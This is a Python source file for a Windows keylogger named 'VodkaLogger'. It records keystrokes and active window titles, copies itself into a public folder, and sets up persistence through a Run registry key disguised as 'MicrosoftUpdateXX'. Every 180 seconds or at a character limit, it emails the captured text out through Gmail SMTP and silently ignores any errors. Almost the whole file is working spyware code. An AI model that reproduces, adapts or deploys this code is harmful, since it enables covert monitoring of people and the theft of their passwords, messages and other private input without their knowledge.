import os
import shutil
import sys
from datetime import datetime
from winreg import *
from pynput import keyboard
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading
import queue


class VodkaLogger:
    """
    A class to represent a keylogger that captures keystrokes and sends them via email.

    Attributes:
        email (str): The email address to send the logs to.
        password (str): The password for the email account.
        name (str): The name of the executable.
        char_limit (int): The character limit for the log before sending an email.
        data (str): The captured keystrokes.
        last_window (str): The last active window title.
        data_queue (queue.Queue): A queue to store keystrokes.
        last_date (datetime): The last time the log was sent.
        user_name (str): The username of the system user.
        dir (str): The directory path for the executable.
    """

    def __init__(self, email, password, name, char_limit=1000):
        """
        Constructs all the necessary attributes for the VodkaLogger object.

        Args:
            email (str): The email address to send the logs to.
            password (str): The password for the email account.
            name (str): The name of the executable.
            char_limit (int): The character limit for the log before sending an email.
        """
        self.email = email
        self.password = password
        self.name = name
        self.char_limit = char_limit
        self.data = ""
        self.last_window = ""
        self.data_queue = queue.Queue()
        self.last_date = datetime.now()
        self.user_name = os.getlogin()
        self.dir = rf"C:\Users\Public\Libraries\{name}.exe"
        self.setup()

    def setup(self):
        """
        Sets up the keylogger by copying the executable to a specified directory,
        adding it to the startup registry, and starting the keyboard listener.
        """
        if not os.path.isfile(self.dir):
            self.startup(self.dir)
        self.send_email("All ready")
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.main_loop()

    def startup(self, dir):
        """
        Copies the executable to the specified directory and adds it to the startup registry.

        Args:
            dir (str): The directory path for the executable.
        """
        shutil.copy(sys.argv[0], dir)
        with ConnectRegistry(None, HKEY_CURRENT_USER) as aReg:
            with OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE) as aKey:
                SetValueEx(aKey, "MicrosoftUpdateXX", 0, REG_SZ, dir)

    def send_email(self, data):
        """
        Sends an email with the captured keystrokes.

        Args:
            data (str): The captured keystrokes.
        """
        msg = MIMEMultipart()
        msg['From'] = "VodkaLogger"
        msg['To'] = self.email
        msg['Subject'] = f"{self.user_name} VodkaLogger"
        msg.attach(MIMEText(data, 'plain'))

        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, msg.as_string())
        except Exception:
            pass

    def on_press(self, key):
        """
        Callback function to handle key press events.

        Args:
            key (Key): The key that was pressed.
        """
        hwnd = win32gui.GetForegroundWindow()
        window = win32gui.GetWindowText(hwnd)
        if window != self.last_window:
            self.last_window = window
            self.data_queue.put(f" {{last_window}} ")
        try:
            self.data_queue.put(str(key.char))
        except AttributeError:
            if str(key) in ["Key.space", "Key.backspace"]:
                self.data_queue.put(f" [{key}] ")

    def main_loop(self):
        """
        Main loop to check if the log should be sent based on time or character limit.
        """
        while True:
            current_date = datetime.now()
            delta = current_date - self.last_date
            if delta.total_seconds() >= 180 or len(self.data) >= self.char_limit:
                self.last_date = current_date
                self.data = ""
                while not self.data_queue.empty():
                    self.data += self.data_queue.get()

                if self.data:
                    self.send_email(self.data)
                    self.data = ""

if __name__ == '__main__':
    pass
